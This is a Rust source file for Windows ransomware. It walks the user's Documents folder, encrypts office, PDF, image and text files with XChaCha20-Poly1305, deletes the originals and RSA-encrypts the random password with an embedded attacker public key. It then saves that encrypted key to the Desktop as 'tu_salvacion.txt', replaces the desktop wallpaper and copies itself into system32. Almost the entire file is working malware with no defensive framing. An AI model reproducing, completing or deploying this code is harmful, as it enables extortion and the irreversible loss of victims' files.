pub mod build;

use std::ffi::OsStr;
use std::fs::{self, remove_file, File};
use std::io::{self, BufWriter, Read, Write};
use std::os::windows::ffi::OsStrExt;
use std::path::Path;

extern crate winapi;
use winapi::um::winuser::{SystemParametersInfoW, SPI_SETDESKWALLPAPER, SPIF_UPDATEINIFILE, SPIF_SENDCHANGE};


use rsa::pkcs8::DecodePublicKey;
use rsa::Pkcs1v15Encrypt;
use rsa::RsaPublicKey;

use orion::hazardous::{
    aead::xchacha20poly1305::{seal, open, Nonce, SecretKey},
    mac::poly1305::POLY1305_OUTSIZE,
    stream::xchacha20::XCHACHA_NONCESIZE,
};

use orion::hazardous::stream::chacha20::CHACHA_KEYSIZE;
use orion::kdf::{derive_key, Password, Salt};
use rand::distributions::Alphanumeric;
use rand::Rng;
use rand_core::{OsRng, RngCore};
use walkdir::WalkDir;

const IMAGE_DATA: &[u8] = include_bytes!(r"resources\backgroound.png");

fn get_random(dest: &mut [u8]) {
    RngCore::fill_bytes(&mut OsRng, dest);
}

fn nonce() -> Vec<u8> {
    let mut randoms: [u8; 24] = [0; 24];
    get_random(&mut randoms);
    return randoms.to_vec();
}

fn auth_tag() -> Vec<u8> {
    let mut randoms: [u8; 32] = [0; 32];
    get_random(&mut randoms);
    return randoms.to_vec();
}

fn simple_split_encrypted(cipher_text: &[u8]) -> (Vec<u8>, Vec<u8>) {
    return (
        cipher_text[..CHACHA_KEYSIZE].to_vec(),
        cipher_text[CHACHA_KEYSIZE..].to_vec(),
        )
}

fn create_key(password: String, nonce: Vec<u8>) -> SecretKey {
    let password = Password::from_slice(password.as_bytes()).unwrap();
    let salt = Salt::from_slice(nonce.as_slice()).unwrap();
    let kdf_key = derive_key(&password, &salt, 15, 1024, CHACHA_KEYSIZE as u32).unwrap();
    let key = SecretKey::from_slice(kdf_key.unprotected_as_bytes()).unwrap();
    return key;
}

fn encrypt_core(
    dist: &mut File,
    contents: Vec<u8>,
    key: &SecretKey,
    nonce: Nonce,
) {
    let ad = auth_tag();
    let output_len = match contents.len().checked_add(POLY1305_OUTSIZE + ad.len()) {
        Some(min_output_len) => min_output_len,
        None => panic!("Plaintext is too long"),
    };

    let mut output = vec![0u8; output_len];
    output[..CHACHA_KEYSIZE].copy_from_slice(ad.as_ref());
    seal(&key, &nonce, contents.as_slice(), Some(ad.clone().as_slice()), &mut output[CHACHA_KEYSIZE..]).unwrap();
    dist.write(&output.as_slice()).unwrap();
}

fn decrypt_core(
    dist: &mut File,
    contents: Vec<u8>,
    key: &SecretKey,
    nonce: Nonce
) {
    let split = simple_split_encrypted(contents.as_slice());
    let mut output = vec![0u8; split.1.len() - POLY1305_OUTSIZE];

    open(&key, &nonce, split.1.as_slice(), Some(split.0.as_slice()), &mut output).unwrap();
    dist.write(&output.as_slice()).unwrap();
}


const CHUNK_SIZE: usize = 128; // The size of the chunks you wish to split the stream into.

pub fn encrypt_large_file(
    file_path: &str,
    output_path: &str,
    password: String
) -> Result<(), orion::errors::UnknownCryptoError> {
    let mut source_file = File::open(file_path).expect("Failed to open input file");
    let mut dist = File::create(output_path).expect("Failed to create output file");

    let mut src = Vec::new();
    source_file.read_to_end(&mut src).expect("Failed to read input file");

    let nonce = nonce();

    dist.write(nonce.as_slice()).unwrap();
    let key = create_key(password, nonce.clone());
    let nonce = Nonce::from_slice(nonce.as_slice()).unwrap();

    for (n_chunk, src_chunk) in src.chunks(CHUNK_SIZE).enumerate() {
        encrypt_core(&mut dist, src_chunk.to_vec(), &key, nonce)
    }

    Ok(())
}

pub fn decrypt_large_file(
    file_path: &str, 
    output_path: &str,
    password: String
) -> Result<(), orion::errors::UnknownCryptoError> {
    let mut input_file = File::open(file_path).expect("Failed to open input file");
    let mut output_file = File::create(output_path).expect("Failed to create output file");

    let mut src: Vec<u8> = Vec::new();
    input_file.read_to_end(&mut src).expect("Failed to read input file");

    let nonce = src[..XCHACHA_NONCESIZE].to_vec();

    src = src[XCHACHA_NONCESIZE..].to_vec();

    let key = create_key(password, nonce.clone());
    let nonce = Nonce::from_slice(nonce.as_slice()).unwrap();

    for (n_chunk, src_chunk) in src.chunks(CHUNK_SIZE + CHACHA_KEYSIZE + POLY1305_OUTSIZE).enumerate() {
        decrypt_core(&mut output_file, src_chunk.to_vec(), &key, nonce);
    }

    Ok(())
}

fn main() {
    
    let extensions = ["docx", "xlsx", "pdf", "jpeg", "jpg", "txt"];

    let documents_dir = match dirs::document_dir() {
        Some(path) => path,
        None => {
            eprintln!("Could not find the Documents folder.");
            return;
        }
    };
    let pass = generate_random_string(20);

    let pem = "-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlpnmNvyemuON6QMsVZZX
29vXAc0rapY0XBqN1qdzf/UoeBDV5VYMh+E4aq0XhDDHEQCLkHmoLgpuP2mVnX3O
P/qNDOuNF2yIMQqRThQ3bTjAQa5MurgWBfZOU8up+RYAD82Lc50amIIYGw368Wep
DN0oPWCRjWF+9AXlfkBcN3PMLYH0uWsBoT6l6ajb5HO1HUX+hxXm3UCxRFr3YTeL
CsVPf8KPVZz+xHJ4C7qLsitsVyHsvHokOyrJ1ZY0W7GIXT8+fwlrzuzWCTvOMs7n
wLG0EUDUsMEbuepjv0ZBtZy+MWdkti9Rfu0Gih247HHDfX6LKwgDJAR7po1wVE9B
SwIDAQAB
-----END PUBLIC KEY-----";

    let public_key = RsaPublicKey::from_public_key_pem(pem).unwrap();
    let mut rng = rand::thread_rng();

    let passenc = public_key.encrypt(&mut rng, Pkcs1v15Encrypt, pass.as_bytes()).unwrap();
    let _ = save_key_to_file(&passenc, "tu_salvacion.txt");

    for entry in WalkDir::new(documents_dir)
        .into_iter()
        .filter_map(Result::ok)
        .filter(|e| {
            e.file_type().is_file() &&
            e.path().extension()
                .and_then(|ext| ext.to_str())
                .map(|ext| extensions.contains(&ext))
                .unwrap_or(false)
        }) {
        let _encrypted_filee = encrypt_large_file(entry.path().to_str().unwrap_or(""), &format!("{}{}", entry.path().to_str().unwrap_or(""), ".enc" ), pass.to_owned());
        let _ = remove_file(entry.path());
    }


   


    let temp_image_path = "C:\\temp_image.jpg";

    match save_image_to_temp_file(temp_image_path, IMAGE_DATA) {
        Ok(_) => println!("Image saved to temporary file successfully."),
        Err(e) => {
            eprintln!("Failed to save image to temporary file: {}", e);
            return;
        }
    };

    if let Err(e) = set_desktop_background(temp_image_path) {
        eprintln!("Failed to set desktop background: {}", e);
    }

    let mut input = String::new();
    io::stdin().read_line(&mut input)
        .expect("Failed to read line");

    let dest_dir = Path::new(r"%WINDIR%\system32\ransomware.exe");


    let current_exe_path = match std::env::current_exe() {
        Ok(path) => path,
        Err(e) => {
            eprintln!("Error getting current executable path: {}", e);
            return;
        }
    };

    println!("{:?}", current_exe_path);

    if let Err(e) = fs::copy(&current_exe_path, &dest_dir) {
        eprintln!("Error copying file: {}", e);
        return;
    }

    let mut input = String::new();
    io::stdin().read_line(&mut input)
        .expect("Failed to read line");

}
fn generate_random_string(length: usize) -> String {
    let s : String = rand::thread_rng()
        .sample_iter(&Alphanumeric)
        .take(length)
        .map(char::from)
        .collect();
    s
}


fn save_key_to_file(key: &[u8], file_name: &str) -> std::io::Result<()> {
    let desktop_dir = match dirs::desktop_dir() {
        Some(path) => path,
        None => return Err(std::io::Error::new(std::io::ErrorKind::NotFound, "Desktop directory not found")),
    };
    let key_file_path = desktop_dir.join(file_name);
    let mut key_file = BufWriter::new(File::create(&key_file_path)?);
    key_file.write_all(key)?;
    Ok(())
}


fn save_image_to_temp_file(path: &str, data: &[u8]) -> std::io::Result<()> {
    let mut file = File::create(path)?;
    file.write_all(data)?;
    file.sync_all()?;
    Ok(())
}

fn set_desktop_background(path: &str) -> Result<(), String> {
    let wide_path: Vec<u16> = OsStr::new(path).encode_wide().chain(std::iter::once(0)).collect();

    unsafe {
        let result = SystemParametersInfoW(
            SPI_SETDESKWALLPAPER,
            0,
            wide_path.as_ptr() as *mut _,
            SPIF_UPDATEINIFILE | SPIF_SENDCHANGE,
        );
    }

    Ok(())
}